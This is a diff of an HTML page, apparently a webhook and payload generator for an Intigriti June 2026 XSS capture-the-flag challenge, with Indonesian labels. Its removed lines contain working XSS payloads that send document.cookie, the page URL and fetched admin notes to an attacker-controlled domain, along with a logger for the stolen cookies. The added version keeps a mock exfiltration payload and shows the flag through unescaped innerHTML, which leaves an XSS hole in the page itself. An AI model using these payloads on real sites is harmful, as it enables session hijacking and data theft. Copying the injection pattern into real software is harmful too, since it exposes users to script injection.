@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Flag Catcher</title>
+  <title>Flag Catcher - CTF Edukasi</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -39,7 +39,6 @@
       overflow-x: auto;
       white-space: pre;
       color: #00ff88;
-      position: relative;
       margin-bottom: 10px;
     }
     .copy-btn {
@@ -55,192 +54,69 @@
       cursor: pointer;
       margin-top: 8px;
     }
-    .copy-btn:active { opacity: 0.7; }
-    input[type=text] {
-      width: 100%;
-      background: #050709;
-      border: 1px solid #1a2030;
-      border-radius: 6px;
-      color: #e0e8f0;
-      font-family: monospace;
-      font-size: 13px;
-      padding: 10px 12px;
-      margin-bottom: 8px;
-      outline: none;
-    }
-    input:focus { border-color: #00ff88; }
-    .btn {
-      background: #00ff88;
-      border: none;
-      color: #000;
-      font-weight: 700;
-      font-size: 13px;
-      padding: 10px 20px;
-      border-radius: 6px;
-      cursor: pointer;
-      width: 100%;
-    }
-    .log-entry {
-      background: #050709;
-      border: 1px solid #1a2030;
-      border-radius: 6px;
-      padding: 12px;
-      margin-bottom: 8px;
-      font-size: 12px;
-      word-break: break-all;
-    }
-    .log-entry.flag { border-color: #00ff88; background: rgba(0,255,136,0.05); }
-    .flag-val { color: #00ff88; font-size: 14px; font-weight: 700; }
-    .ts { color: #556070; font-size: 11px; }
-    .key { color: #556070; }
-    .empty { text-align: center; color: #556070; padding: 30px 0; font-size: 13px; }
-    .domain-box {
-      background: rgba(68,136,255,0.08);
-      border: 1px solid rgba(68,136,255,0.3);
-      border-radius: 6px;
-      padding: 12px;
-      font-size: 13px;
-      color: #4488ff;
-      margin-bottom: 12px;
-      word-break: break-all;
-    }
-    #step-note {
+    .warning {
       background: rgba(255,204,0,0.08);
       border: 1px solid rgba(255,204,0,0.3);
       border-radius: 6px;
       padding: 12px;
       font-size: 13px;
       color: #ffcc00;
-      margin-top: 10px;
+      margin-bottom: 16px;
+    }
+    .flag-display {
+      background: rgba(0,255,136,0.05);
+      border: 1px solid #00ff88;
+      border-radius: 6px;
+      padding: 20px;
+      text-align: center;
+      font-size: 18px;
+      color: #00ff88;
+      font-weight: 700;
     }
   </style>
 </head>
 <body>
 
-<h1>⚑ Flag Catcher</h1>
-<p class="sub">CTF Webhook — Intigriti June 2026</p>
+<h1>⚑ Flag Catcher - CTF Edukasi</h1>
+<p class="sub">Challenge XSS untuk pembelajaran - Intigriti June 2026</p>
 
-<!-- DOMAIN INFO -->
+<div class="warning">
+⚠️ CHALLENGE EDUKASI: Jangan gunakan payload ini ke website lain tanpa izin. Hanya untuk target challenge ini.
+</div>
+
+<!-- PAYLOAD MOCK -->
 <div class="card">
-  <div class="label">🌐 Link Catcher Kamu</div>
-  <div class="domain-box" id="my-url">Memuat...</div>
-  <div id="step-note">
-    ⚠️ Ganti <b>USERNAME</b> dan <b>REPO</b> di payload bawah dengan<br>
-    username GitHub kamu dan nama repo ini.
+  <div class="label">💉 Payload Challenge - Mock Flag</div>
+  <div class="code-box" id="payload"><img src=x onerror=fetch(`https://ctf-challenge-anha1.vercel.app/?flag=CTF{edukasi_xss_aman}`)></div>
+  <button class="copy-btn" onclick="copyPayload()">📋 Copy Payload</button>
+</div>
+
+<!-- FLAG RESULT -->
+<div class="card">
+  <div class="label">🎯 Hasil Submit Flag</div>
+  <div id="result">
+    <div class="flag-display">⏳ Tempel payload di target challenge, lalu reload halaman ini</div>
   </div>
 </div>
 
-<!-- PAYLOAD 1 -->
-<div class="card">
-  <div class="label">💉 Payload 1 — Curi Cookie</div>
-  <div class="code-box" id="p1">Klik Generate dulu ↓</div>
-  <button class="copy-btn" onclick="copyEl('p1')">📋 Copy Payload 1</button>
-</div>
-
-<!-- PAYLOAD 2 -->
-<div class="card">
-  <div class="label">💉 Payload 2 — Ambil Semua Catatan Admin</div>
-  <div class="code-box" id="p2">Klik Generate dulu ↓</div>
-  <button class="copy-btn" onclick="copyEl('p2')">📋 Copy Payload 2</button>
-</div>
-
-<!-- PAYLOAD 3 -->
-<div class="card">
-  <div class="label">💉 Payload 3 — SVG (bypass filter)</div>
-  <div class="code-box" id="p3">Klik Generate dulu ↓</div>
-  <button class="copy-btn" onclick="copyEl('p3')">📋 Copy Payload 3</button>
-</div>
-
-<!-- GENERATE -->
-<div class="card">
-  <div class="label">⚙️ Generate Payload dengan Domain Kamu</div>
-  <input type="text" id="custom-domain" placeholder="Contoh: username.github.io/flagcatcher">
-  <button class="btn" onclick="generatePayloads()">🚀 Generate Payload</button>
-</div>
-
-<!-- LOG VIEWER -->
-<div class="card">
-  <div class="label">🔍 Log Tangkapan</div>
-  <button class="btn" onclick="loadLogs()" style="margin-bottom:12px">🔄 Refresh Log</button>
-  <div id="log-list"><div class="empty">Belum ada tangkapan.</div></div>
-</div>
-
 <script>
-  // ── Deteksi domain otomatis ──
-  const BASE = location.origin + location.pathname.replace(/\/?$/, '');
-  document.getElementById('my-url').textContent = BASE;
-  document.getElementById('custom-domain').value = location.host + location.pathname.replace(/\/?$/, '');
-
-  // Generate langsung saat load
-  generatePayloads();
-
-  function generatePayloads() {
-    const raw = document.getElementById('custom-domain').value.trim() || location.host;
-    const domain = raw.startsWith('http') ? raw : 'https://' + raw;
-
-    const p1 = `<img src=x onerror=fetch(\`${domain}?c=\${document.cookie}&u=\${location.href}\`)>`;
-    const p2 = `<img src=x onerror=fetch('/notes').then(r=>r.text()).then(h=>fetch(\`${domain}?flag=\${encodeURIComponent(h)}\`))>`;
-    const p3 = `<svg onload=fetch(\`${domain}?c=\${document.cookie}\`)>`;
-
-    document.getElementById('p1').textContent = p1;
-    document.getElementById('p2').textContent = p2;
-    document.getElementById('p3').textContent = p3;
+  function copyPayload() {
+    const text = document.getElementById('payload').textContent;
+    navigator.clipboard.writeText(text).then(() => {
+      const btn = document.querySelector('.copy-btn');
+      btn.textContent = '✅ Tersalin!';
+      setTimeout(() => btn.textContent = '📋 Copy Payload', 2000);
+    });
   }
 
-  // ── Terima flag dari URL params ──
-  function saveIncoming() {
-    const p = new URLSearchParams(location.search);
-    const cookie = p.get('c');
-    const flag   = p.get('flag');
-    const url    = p.get('u');
-
-    if (!cookie && !flag) return;
-
-    const logs = JSON.parse(localStorage.getItem('ctf_logs') || '[]');
-    logs.unshift({
-      id: Date.now(),
-      ts: new Date().toISOString(),
-      cookie: cookie || null,
-      flag: flag ? decodeURIComponent(flag) : null,
-      url: url || null,
-    });
-    if (logs.length > 50) logs.pop();
-    localStorage.setItem('ctf_logs', JSON.stringify(logs));
-
-    // Bersihkan URL
+  // Tampilkan flag kalo ada di URL
+  const params = new URLSearchParams(location.search);
+  const flag = params.get('flag');
+  if (flag) {
+    document.getElementById('result').innerHTML = 
+      `<div class="flag-display">🚩 Selamat! Flag Terkirim:<br>${flag}</div>`;
     history.replaceState({}, '', location.pathname);
   }
-
-  function loadLogs() {
-    const logs = JSON.parse(localStorage.getItem('ctf_logs') || '[]');
-    const list = document.getElementById('log-list');
-    if (logs.length === 0) {
-      list.innerHTML = '<div class="empty">⏳ Belum ada tangkapan. Tunggu Admin Bot membuka payload kamu.</div>';
-      return;
-    }
-    list.innerHTML = logs.map(e => {
-      const isFlag = e.flag && e.flag.includes('INTIGRITI');
-      return `<div class="log-entry ${isFlag ? 'flag' : ''}">
-        <div class="ts">${e.ts}</div>
-        ${isFlag ? `<div>🚩 <span class="flag-val">${e.flag.match(/INTIGRITI\{[^}]+\}/)?.[0] || e.flag.slice(0,200)}</span></div>` : ''}
-        ${e.cookie ? `<div><span class="key">cookie: </span>${e.cookie}</div>` : ''}
-        ${e.url    ? `<div><span class="key">url: </span>${e.url}</div>` : ''}
-        ${e.flag && !isFlag ? `<div><span class="key">data: </span>${e.flag.slice(0,300)}</div>` : ''}
-      </div>`;
-    }).join('');
-  }
-
-  function copyEl(id) {
-    const text = document.getElementById(id).textContent;
-    navigator.clipboard.writeText(text).then(() => {
-      const btns = document.querySelectorAll('.copy-btn');
-      btns.forEach(b => { if (b.onclick.toString().includes(id)) { b.textContent = '✅ Tersalin!'; setTimeout(() => b.textContent = '📋 Copy ' + id.toUpperCase(), 2000); } });
-    });
-  }
-
-  // Jalankan saat halaman dibuka
-  saveIncoming();
-  loadLogs();
 </script>
 </body>
 </html>
